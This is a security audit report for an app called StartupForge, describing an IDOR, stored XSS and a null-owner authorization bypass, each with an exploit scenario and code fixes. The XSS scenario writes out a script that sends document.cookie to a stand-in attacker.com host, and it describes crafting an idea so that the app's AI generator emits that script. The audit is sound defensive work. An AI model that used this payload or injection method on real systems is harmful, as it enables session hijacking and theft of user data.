# Security Audit — StartupForge

3 confirmed vulnerabilities (Finding 4 — Telegram injection — filtered as false positive: Telegram HTML parse mode has no script execution, impact is cosmetic formatting in operator's private chat only).

---

# Vuln 1: IDOR — `app/api/status/[id]/route.ts`

**Severity:** High
**Confidence:** 9/10

**Description:** `/api/status/[id]` calls `getRun(runId)` with no ownership check. Any authenticated user can pass any run UUID and receive the full `Run` object — `idea`, `landing_html`, `posts_md`, `competitors_md`, `agent_prompts_md` — via SSE. Middleware enforces only authentication (session exists), not authorization (ownership). The correct helper `getRunForUser(id, userId)` already exists in `lib/supabase.ts` but is never called here.

**Exploit Scenario:** Attacker signs up, submits one idea to observe UUID format, obtains victim's `runId` (shared link, browser history, network traffic), calls `GET /api/status/<victim_run_id>`. Receives complete run data as SSE `status` + `complete` events with full `run` payload.

**Fix:**
```ts
// app/api/status/[id]/route.ts
import { auth } from '@clerk/nextjs/server';
// ...
const { userId } = await auth();
if (!userId) return new Response('Unauthorized', { status: 401 });
const run = await getRunForUser(params.id, userId);
if (!run) return new Response('Not found', { status: 404 });
```

---

# Vuln 2: Stored XSS — `app/api/preview/[id]/route.ts` + `components/OutputPanel.tsx`

**Severity:** High
**Confidence:** 9/10

**Description:** Two independent vectors:

**Vector A — Public preview endpoint:** `/api/preview/[id]` is explicitly public (no auth — `middleware.ts` line 6). It fetches `landing_html` from Supabase and serves it verbatim as `Content-Type: text/html` with no sanitization and no `Content-Security-Policy`. Scripts in the AI-generated HTML execute in the full app origin, with access to same-origin cookies and storage (including Clerk session tokens).

**Vector B — Unsandboxed iframe:** `components/OutputPanel.tsx` renders `landing_html` via `<iframe srcDoc={content}>` with no `sandbox` attribute. Without sandbox, the srcdoc iframe inherits the parent document's origin — scripts execute with full same-origin privileges for the authenticated run owner.

**Exploit Scenario (Vector A):** Attacker registers, submits idea crafted to induce the AI to include `<script>fetch('https://attacker.com/?c='+document.cookie)</script>` in the landing page HTML. Shares the public `/api/preview/<run_id>` URL. Any victim who clicks the link executes attacker JS in the app's full origin — session hijack possible.

**Fix:**

```ts
// app/api/preview/[id]/route.ts — add CSP header
return new Response(run.landing_html, {
  headers: {
    'Content-Type': 'text/html',
    'Content-Security-Policy': "default-src 'self'; script-src 'none'; object-src 'none';",
    'X-Frame-Options': 'DENY',
  },
});
```

```tsx
// components/OutputPanel.tsx — sandbox the iframe
<iframe
  srcDoc={content}
  sandbox="allow-forms allow-same-origin"
  // no allow-scripts
/>
```

---

# Vuln 3: Authorization Bypass — `lib/supabase.ts:75`

**Severity:** Medium
**Confidence:** 8/10

**Description:** `getRunForUser()` ownership check:

```ts
if (run.user_id && run.user_id !== userId) return null;
```

Short-circuits when `run.user_id` is `null` — returns the run to any authenticated caller. Schema defines `user_id text` with no `NOT NULL` constraint. The column was added via `ALTER TABLE ... ADD COLUMN IF NOT EXISTS user_id text` — any rows created before the migration have `user_id = NULL` and are accessible to all authenticated users.

This affects:
- `GET /api/runs/[id]` — full run data returned
- `DELETE /api/runs/[id]` — run deleted by non-owner
- `GET /api/run-task` — attacker resumes/hijacks task execution on a null-owner run, bypassing the monthly rate-limit check (`createRun` path is skipped)

**Exploit Scenario:** Attacker calls `GET /api/runs/<pre-migration-run-uuid>` — receives full run data. Or calls `DELETE` — destroys run they don't own. Or calls `/api/run-task` with that UUID — runs tasks billed against the original owner's quota.

**Fix:**

```ts
// lib/supabase.ts
export async function getRunForUser(id: string, userId: string): Promise<Run | null> {
  const run = await getRun(id);
  if (!run) return null;
  if (run.user_id !== userId) return null; // strict equality, null fails
  return run;
}
```

Also add `NOT NULL` constraint and backfill:
```sql
UPDATE runs SET user_id = 'unknown' WHERE user_id IS NULL;
ALTER TABLE runs ALTER COLUMN user_id SET NOT NULL;
```

---

## Summary

| # | File | Type | Severity |
|---|------|------|----------|
| 1 | `app/api/status/[id]/route.ts` | IDOR — no ownership check | High |
| 2 | `app/api/preview/[id]/route.ts` + `OutputPanel.tsx` | Stored XSS — raw AI HTML, no CSP, unsandboxed iframe | High |
| 3 | `lib/supabase.ts:75` | Auth bypass — null `user_id` short-circuit | Medium |
